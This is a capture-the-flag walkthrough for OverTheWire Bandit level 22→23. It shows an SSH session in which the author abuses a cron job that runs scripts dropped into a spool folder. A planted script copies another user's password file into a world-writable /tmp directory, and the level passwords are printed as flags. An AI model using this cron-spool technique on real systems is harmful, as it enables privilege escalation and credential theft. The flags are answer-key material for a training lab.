# Bandit Level 22 → Level 23 Cronjobs

## Previous Flag
<b>0Zf11ioIjMVN551jX3CmStKLYqjk54Ga</b>

## Goal
Use previous password to log in SSH with user <b>bandit23</b> on port <b>2220</b>. A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in <b>/etc/cron.d/</b> for the configuration and see what command is being executed.

NOTE: This level requires you to <b>create your own first shell-script</b>
NOTE: Your shell <b>script is removed once executed</b>, so you may want to keep a copy around …

## What I learned
```
mktemp -d:                  not work due to restrictions set by sysAdmin
/var/spool/$myname/foo      folder where script deletes bandit24
/tmp/                       no access, exploit w/ creating subfolder
deeper understanding of cron
```

## Solution
```
@trungdullc ➜ /workspaces/01noobHacker (main) $ ssh bandit23@bandit.labs.overthewire.org -p 2220 ⌨️
bandit23@bandit:~$ whatis chmod cron crontab ⌨️
chmod (1)            - change file mode bits
chmod (2)            - change permissions of a file
cron (8)             - daemon to execute scheduled commands (Vixie Cron)
crontab (1)          - maintain crontab files for individual users (Vixie Cron)
crontab (5)          - tables for driving cron
bandit23@bandit:~$ man 5 crontab ⌨️
CRONTAB(5)                                                  File Formats Manual                                                 CRONTAB(5)

NAME
       crontab - tables for driving cron

DESCRIPTION
       A  crontab  file  contains  instructions to the cron(8) daemon of the general form: ``run this command at this time on this date''.
       Each user has their own crontab, and commands in any given crontab will be executed as the user who owns  the  crontab.   Uucp  and
       News will usually have their own crontabs, eliminating the need for explicitly running su(1) as part of a cron command.

 Manual page crontab(5) line 1 (press h for help or q to quit)
bandit23@bandit:/etc/cron.d$ ls ⌨️
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job  sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24 ⌨️
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh ⌨️
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ mkdir /tmp/everyoneaccess && chmod 777 /tmp/everyoneaccess ⌨️
bandit23@bandit:/etc/cron.d$ vi /tmp/everyoneaccess/main.sh ⌨️
bandit23@bandit:/etc/cron.d$ cat /tmp/everyoneaccess/main.sh ⌨️
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/everyoneaccess/pass.txt
bandit23@bandit:/etc/cron.d$ ls -la  /tmp/everyoneaccess/main.sh ⌨️
-rw-rw-r-- 1 bandit23 bandit23 178 Aug  1 22:54 /tmp/everyoneaccess/main.sh
bandit23@bandit:/etc/cron.d$ chmod +x /tmp/everyoneaccess/main.sh ⌨️
bandit23@bandit:/etc/cron.d$ ls -la  /tmp/everyoneaccess/main.sh ⌨️
-rwxrwxr-x 1 bandit23 bandit23 178 Aug  1 22:54 /tmp/everyoneaccess/main.sh
bandit23@bandit:/etc/cron.d$ cp /tmp/everyoneaccess/main.sh /var/spool/bandit24/foo/ ⌨️
bandit23@bandit:/tmp/everyoneaccess$ cat pass.txt ⌨️                             # Wait 1 min
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 🔐
```

## Flag
<b>gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8</b>

## Continue
[Continue](/overthewire/Bandit2324.md)